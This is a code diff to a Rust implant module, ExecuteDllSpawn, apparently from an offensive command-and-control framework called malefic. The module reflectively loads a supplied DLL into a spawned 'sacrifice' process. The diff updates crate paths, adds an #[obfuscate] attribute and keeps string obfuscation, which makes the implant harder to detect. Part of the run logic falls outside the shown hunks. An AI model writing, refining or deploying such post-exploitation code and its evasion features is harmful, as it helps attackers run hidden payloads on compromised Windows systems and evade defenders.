@@ -1,8 +1,7 @@
-use malefic_helper::common::utils::format_cmdline;
-use malefic_helper::win::kit::pe::reflective_loader::reflective_loader;
-use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::prelude::*;
-
+use malefic_common::utils::format_cmdline;
+use malefic_os_win::kit::pe::reflective_loader::reflective_loader;
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 pub struct ExecuteDllSpawn {}
 
@@ -11,12 +10,13 @@ pub struct ExecuteDllSpawn {}
 impl Module for ExecuteDllSpawn {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteDllSpawn {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteDllSpawn {
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        _sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        _sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = request.bin;
@@ -47,17 +47,17 @@ impl malefic_proto::module::ModuleImpl for ExecuteDllSpawn {
             }
             error = String::new();
         } else {
-            error = obfstr::obfstr!("sacrifice is none").to_string();
+            error = malefic_gateway::obfstr::obfstr!("sacrifice is none").to_string();
         }
 
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse {
-            status: 0,
-            message: Vec::new(),
-            data: result,
-            err: error,
-        }))
-        )
-
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: result,
+                err: error,
+            }),
+        ))
     }
 }
-
